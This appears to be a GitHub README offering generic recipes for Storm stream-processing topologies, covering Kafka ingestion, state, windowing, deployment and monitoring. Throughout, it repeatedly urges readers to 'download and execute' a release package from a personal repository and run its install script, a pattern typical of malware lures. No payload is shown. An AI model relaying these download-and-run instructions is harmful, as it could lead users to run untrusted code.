# Storm Cookbook: Practical STORM Solutions and Recipes

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/fergykfergyk/storm-cookbook/releases)

![Storm Cookbook Hero](https://images.unsplash.com/photo-1501594907352-04cda38ebc29?ixlib=rb-4.0.3&auto=format&fit=crop&w=1650&q=80)

Welcome to the Storm Cookbook. This guide collects patterns, recipes, and practical examples for Building with STORM Solution. Use the Releases page to get the packaged tools and reference artifacts. Download and execute the release artifact from https://github.com/fergykfergyk/storm-cookbook/releases.

Table of Contents
- Quick links
- What this repository covers
- Core STORM concepts
- Getting started
  - Prerequisites
  - Download and run the release
  - Local test topology
- Recipes
  - Ingest patterns
  - Parsing and enrichment
  - Stateful processing
  - Windowing and time handling
  - Exactly-once and at-least-once strategies
  - Scaling and deployment
  - Resource tuning and GC
- Integration patterns
  - Kafka
  - S3 / Object storage sinks
  - Databases and caches
  - Metrics and tracing
- CI / CD and packaging
  - Docker
  - Helm and Kubernetes
  - Release artifacts
- Observability
  - Logging
  - Metrics
  - Tracing
  - Alerts and dashboards
- Testing strategies
  - Unit tests
  - Integration tests
  - Load tests
- Troubleshooting checklist
- Contributing
- License
- Appendix
  - Topology templates
  - Common config snippets
  - Helpful links and images

Quick links
- Releases (download and execute): https://github.com/fergykfergyk/storm-cookbook/releases
- Badge for releases: [![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=flat-square)](https://github.com/fergykfergyk/storm-cookbook/releases)

What this repository covers
This repository lays out a set of recipes for building stream processing systems with STORM Solution. It focuses on repeatable patterns you can apply to real systems. The content covers architecture, code, deployment, testing, and operations. Each recipe includes rationale, code samples, config examples, and test advice.

Core STORM concepts
- Topology: A graph of spouts and bolts that defines a streaming computation.
- Spout: A source of tuples. A spout emits records into the topology.
- Bolt: A processing node. A bolt receives tuples, processes them, and may emit new tuples.
- Stream: A sequence of tuples identified by a stream id.
- Tuple: A data record passed between components.
- Task: A running instance of a bolt or spout. Parallelism maps tasks to executors.
- Acking: The mechanism STORM uses to track tuple processing for reliability.
- Grouping: The routing technique used to deliver tuples to bolts (shuffle, fields, all, direct).
- Worker: A JVM process that runs a subset of the topology.
- Supervisor and Nimbus: Components that manage workers and topologies on the cluster.

Getting started

Prerequisites
- Java 11 or later
- Maven 3.x or Gradle 6.x
- Docker (for local containerized runs)
- Kafka and Zookeeper (if you plan to use Kafka spouts)
- Access to the Releases page to fetch packaged artifacts

Download and run the release
You will find release artifacts on the Releases page. Download the main release file and execute it as described in the release notes. The release includes topology templates, deployment manifests, and CLI helpers. Use the Releases link: https://github.com/fergykfergyk/storm-cookbook/releases.

Example high-level steps
1. Visit the Releases page.
2. Download the release artifact for your platform (tar.gz, zip, or installer).
3. Extract the archive.
4. Run the included installer or script. The release includes a script `install.sh` or `install.bat` that sets up helpers and sample topologies.

If the link does not work, check the Releases section of the repository for artifacts and manual downloads.

Local test topology
This recipe shows how to run a simple word-count topology on a local STORM instance. The sample topology exists in the release package.

Basic commands
- Start a local cluster (long-running mode): `bin/storm local`
- Submit a topology: `bin/storm jar target/storm-cookbook-topologies.jar com.example.topologies.WordCountTopology wordcount`
- Kill a topology: `bin/storm kill wordcount -w 30`

Recipes
Each recipe follows a pattern: problem, goal, code skeleton, config, test approach, and deployment notes.

Recipe: Ingest patterns
Problem
You need to collect data from many producers with varying throughput and provide durable ingestion.

Goal
Build resilient ingestion that absorbs burst load and backpressure.

Pattern: Kafka-first ingestion
- Use Kafka as the durable buffer.
- Use a Kafka spout that commits offsets after bolts ack tuples.
- Partition topics by a routing key that aligns with downstream grouping.

Code sketch (pseudocode)
- Spout: KafkaSpout configured with consumer group and deserializer.
- Bolts:
  - ParserBolt: parse JSON, validate schema.
  - EnrichmentBolt: add metadata or look up values.
  - SinkBolt: write to target storage or database.

Config tips
- Set max.poll.records to a moderate value to control batch size.
- Use consumer isolation.level=read_committed if producers use transactions.
- Tune `fetch.max.bytes` and `max.partition.fetch.bytes` to match message sizes.

Backpressure and capacity
- Use bounded executor queues in bolts to drop or route high-latency tuples.
- Use a backpressure signal to Kafka producers during overload windows.

Recipe: Parsing and enrichment
Problem
Input messages vary in schema and may contain errors.

Goal
Normalize and enrich records with clear handling for bad data.

Pattern
- Use a parser bolt with schema-driven validation (JSON schema or Avro).
- Use a dead-letter stream for failed records.
- Enrich via local cache or async lookup.

Implementation notes
- Keep parsers deterministic and side-effect free.
- Prefer async enrichments with timeouts and fallbacks.
- Buffer failed lookups to retry later.

Dead-letter handling
- Emit malformed records to a `dlq` topic in Kafka.
- Tag records with failure reason, original payload, and timestamps.

Recipe: Stateful processing
Problem
You need per-key state such as counts, windows, or session info.

Goal
Maintain consistent, recoverable state with low latency.

Pattern: Local state with periodic checkpointing
- Use bolt-local state store for fast updates.
- Periodically snapshot state to durable storage (S3, HDFS, or a database).
- Replay from Kafka to rebuild state after failure.

Alternative: External state store
- Use a distributed store like Redis for shared state.
- Use RocksDB for large local keyed state, persisted to disk.

Implementation sketch
- Key by a partition key using fieldsGrouping.
- Bolt holds an in-memory map or RocksDB instance indexed by key.
- On tuple, update state and ack.
- On checkpoint interval, write snapshots and record the Kafka offset.

Exactly-once considerations
- Use transactional sinks when available.
- Use idempotent writes at the sink.
- Track processed tuple ids to avoid duplicates.

Recipe: Windowing and time handling
Problem
You must compute aggregations over sliding or tumbling windows.

Goal
Support event-time and processing-time windows with late data handling.

Pattern
- Attach timestamps at the source.
- Use a watermarking strategy to mark progress of event time.
- Implement window bolts that emit when watermark passes window end.

Design points
- Use fixed-size tumbling windows for periodic snapshots.
- Use sliding windows for overlapping aggregates.
- Use session windows for user sessions.

Late data
- Buffer late events for a configurable grace period.
- Emit correction tuples when late events change prior aggregates.

Recipe: Exactly-once and at-least-once strategies
Overview
STORM provides at-least-once processing by default via acking. To approach exactly-once, you combine idempotent sinks, transactional sinks, and state snapshotting.

Strategies
- Idempotent sinks: attach a unique id and use upserts to deduplicate.
- Two-phase commit sinks: prepare/commit across partitions when sink supports it.
- Checkpoint and replay: checkpoint state with an offset and replay from Kafka to reach a known consistent point.

Code pointers
- Maintain a processed-message table keyed by tuple id.
- Use transactional producers for Kafka sinks where possible.

Recipe: Scaling and deployment
Deploying to production
- Use multiple workers per topology to distribute load.
- Assign parallelism hints for spouts and bolts by traffic and processing cost.
- Use vertical scaling (increase JVM heap/CPU) for heavy bolts, horizontal scaling for stateless components.

Topology configuration examples
- Set `topology.workers` to control JVM processes.
- Set `topology.max.task.parallelism` to limit tasks per worker.
- Tune `topology.memory.onheap` and `topology.memory.offheap` as needed.

Resource tuning and GC
- Use G1GC or ZGC on modern JVMs for low pause times.
- Configure `-Xmx` and `-Xms` to match container limits.
- Monitor GC times and adjust heap ratio and young generation accordingly.

Integration patterns

Kafka
- Use compacted topics for idempotent state stores.
- Use schema registry and Avro/Protobuf to enforce structure.
- Prefer at-least-once with committed offsets only after ack.

S3 / Object storage sinks
- Buffer writes and flush in batches.
- Use partitioning by date and hour for efficient reads.
- Ensure atomic file writes using temporary names and finalizing rename.

Databases and caches
- Prefer asynchronous batched writes.
- Use write-behind patterns to avoid blocking bolt threads.
- Use caches for lookup with TTL and async refresh.

Metrics and tracing
- Expose bolt-level metrics: tuples processed, latencies, failures.
- Feed metrics into Prometheus with a push gateway or exporter.
- Use tracing spans to follow a tuple across components.

CI / CD and packaging

Docker
- Build minimal images with only runtime dependencies.
- Use multi-stage builds to compile inside a builder image and copy artifacts to runtime image.
- Expose required ports and mount config as secrets or volumes.

Sample Dockerfile (concept)
```dockerfile
FROM eclipse-temurin:11-jre
COPY target/storm-cookbook-topologies.jar /app/topologies.jar
COPY conf /app/conf
ENTRYPOINT ["java", "-Xms512m", "-Xmx2g", "-jar", "/app/topologies.jar"]
```

Helm and Kubernetes
- Run workers as StatefulSets only if you use persistent local state.
- Use Deployments for stateless worker processes.
- Configure resource limits, liveness probes, and readiness probes.

Release artifacts
- The Releases page contains packaged topologies, deployment manifests, and helper scripts.
- Download and execute the release package from the Releases link to bootstrap your environment.

Observability

Logging
- Use structured logs (JSON) with common fields (timestamp, topology, bolt, task, tupleId, level).
- Route logs to a centralized system (ELK or Loki).
- Avoid heavy logging at DEBUG level in production.

Metrics
- Expose counters for processed tuples, emitted tuples, failures.
- Expose histograms for bolt processing latency.
- Create dashboards that show tail latencies, throughput, and error rates.

Tracing
- Tag traces with topology id, component, and tuple id.
- Use a sampling policy that captures representative traces for high-latency flows.
- Correlate traces with logs using tuple id.

Alerts and dashboards
- Alert on:
  - Topology failure or unexpected restarts.
  - Spikes in tuple latency.
  - Increasing rate of failed tuples.
- Dashboards:
  - Throughput per topology
  - Latency percentiles per bolt
  - Backpressure and queue sizes

Testing strategies

Unit tests
- Test individual bolts and spouts with fakes or small harnesses.
- Use a local mock of external systems.

Integration tests
- Use testcontainers to run Kafka, Redis, or other dependencies.
- Start a local Storm cluster and submit test topologies.

Load tests
- Run synthetic load using a dedicated producer.
- Measure throughput, tail latency, and resource usage.
- Use a canary run in a staging cluster that mirrors production.

Testing checklist
- Validate schema compatibility.
- Validate idempotent behavior for sinks.
- Validate state recovery by simulating node failure.

Troubleshooting checklist
- Check worker logs for stack traces.
- Check supervisor and nimbus status.
- Monitor resource usage across nodes.
- Inspect Kafka lag for spouts that read from topics.
- Verify GC logs for long pauses.

Common issues and fixes
- Issue: High tuple latency on a bolt.
  - Check for blocking calls in bolt code.
  - Move heavy work to an async worker pool.
  - Increase parallelism for the bolt.

- Issue: Frequent restarts of workers.
  - Check JVM memory and GC logs.
  - Lower heap or increase node memory limits.

- Issue: At-least-once duplicates in sinks.
  - Make sink idempotent.
  - Use unique transaction ids when supported.

Contributing
- Fork the repo and create a feature branch.
- Add tests for new recipes or changes.
- Update README recipes with new config and examples.
- Open a pull request with a clear change description.

Template PR checklist
- [ ] Runs unit tests locally
- [ ] Adds or updates a recipe
- [ ] Updates release notes if needed

License
This repository uses the MIT License. See the LICENSE file for details.

Appendix

Topology templates
- WordCountTopology
  - Spout: TextFileSpout or KafkaSpout
  - Bolt chain: SplitBolt -> CountBolt -> ReportBolt

- SessionizationTopology
  - Spout: KafkaSpout with session records
  - Bolt chain: EnrichBolt -> SessionBolt -> SessionCloseBolt

- ETLTopology
  - Spout: KafkaSpout
  - Bolt chain: ParserBolt -> TransformBolt -> BatchSinkBolt

Common config snippets

topology.yaml
```yaml
topology:
  name: example-topology
  workers: 4
  max_spout_pending: 5000
  message_timeout_secs: 120
  acker_execs: 2
  metrics_reporters:
    - prometheus
```

kafka-spout.properties
```properties
bootstrap.servers=kafka:9092
group.id=storm-cookbook-group
auto.offset.reset=earliest
enable.auto.commit=false
max.poll.records=500
```

Sample bolt pattern (pseudocode)
- Use a single-threaded event loop inside the bolt to handle tuples.
- Offload blocking calls to an executor with bounded queue.

Helpful links and images
- STORM project docs and API (use your vendor docs if using a custom STORM Solution).
- Diagram: STORM topology concept
  - ![Storm Topology Diagram](https://upload.wikimedia.org/wikipedia/commons/8/8a/Data_flow_topology_diagram.svg)
- Cloud image for hero: Unsplash (used above)

Release usage notes
The Releases page contains packaged resources that the recipes reference. Download the release artifact, extract it, and run the included scripts to install sample topologies and deployment manifests. The release file includes:
- Prebuilt jar files for the sample topologies
- Helm chart templates
- Dockerfiles and container images
- Config templates
- Example monitoring dashboards

Example: install steps after download
1. Extract the release: `tar -xzvf storm-cookbook-release-<version>.tar.gz`
2. Change directory: `cd storm-cookbook-release-<version>`
3. Run installer: `./install.sh` or `./deploy-locally.sh`
4. Follow the script prompts to deploy sample topologies

If these scripts do not match your environment, use the included templates and customize them.

Deep-dive content (selected recipe details)

1) Stateful session windows with RocksDB
Goal
Maintain per-user session state that spans large numbers of keys and survives restarts.

Design
- Use fields grouping on `user_id`.
- Bolt holds RocksDB instance per task for persistent key-value state.
- On session activity, update last seen timestamp and session data.
- Use a background thread to flush and compact RocksDB.
- Emit closed sessions when inactivity exceeds a threshold.

Key points
- Keep write batches small to avoid long stalls.
- Use async writes if the database supports them.
- Monitor disk IO and compaction stalls.

2) Exactly-once with transactional sinks
Goal
Ensure no duplicate records in final sink.

Design
- Use transactional producer for Kafka sinks where sink accepts transactions.
- Buffer per-partition writes and commit transactions when a checkpoint completes.
- Save transaction id and offsets in a durable checkpoint.

Implementation sketch
- Every worker maintains a transaction context.
- On checkpoint, call `producer.beginTransaction()`, write batch, `producer.flush()`, then `producer.commitTransaction()`.
- On failure recover, abort any open transactions and roll forward using offset checkpoints.

3) Handling schema evolution
Goal
Support evolving message schemas without breaking consumers.

Design
- Use a schema registry with versioned schemas (Avro/Protobuf).
- Keep old schema readers active for a transition period.
- Implement a compatibility policy in the parser bolt that can handle both old and new schemas.

4) Backpressure and queue management
Goal
Avoid unbounded memory growth when downstream sinks slow down.

Pattern
- Use bounded in-memory queues in bolts and drop or redirect tuples when queues fill.
- Expose a backpressure metric to producers.
- Implement slow-path: when queue depth exceeds threshold, send tuples to a fallback queue (e.g., Kafka overflow topic) and emit a metric.

5) Deployment with canaries
Goal
Deploy topology changes with minimal risk.

Pattern
- Deploy a new topology with a versioned name.
- Route a small percentage of traffic to the new topology.
- Monitor key SLOs (latency, error rate, throughput).
- Promote traffic incrementally and deprecate the old topology after validation.

Monitoring checklist for canary
- End-to-end latency P95 and P99
- Error rate against baseline
- Resource usage per worker

FAQ

Q: Where do I get the packaged topologies and scripts?
A: Download and execute the release artifact from the Releases page: https://github.com/fergykfergyk/storm-cookbook/releases

Q: Can I run these recipes on a managed STORM service?
A: Yes. Replace cluster-level deployment commands with your service's deployment primitives. Use the same topology and config patterns.

Q: How do I test state recovery?
A: Snapshot state, kill a worker, restart, and replay from the last checkpointed offset. Validate state matches expected values.

Q: How do I avoid hot partitions?
A: Choose partition keys that distribute traffic. Hash over a secondary key when one key dominates. Use salting strategies for skewed keys.

Contributing recipes
- Add recipes under `/recipes/<topic>` with a README and example code.
- Include test cases and a small dataset for reproducible tests.
- Add doctrings or inline comments in code that explain tradeoffs.

Project layout (recommended)
- /recipes - human-readable guides and examples
- /topologies - source code for sample topologies
- /deploy - Helm charts, Dockerfiles, k8s manifests
- /tests - integration and load tests
- /docs - reference docs and diagrams

Image credits
- Hero image: Unsplash (cloud image used above)
- Diagram: Wikimedia Commons (data flow topology diagram)

Contact and support
- Open issues on GitHub for bugs, feature requests, or questions.
- Submit PRs with code and tests for new recipes.

License and attribution
This repo uses the MIT License. See LICENSE file. The release artifacts contain templates and code you can adapt for your environment.

End of file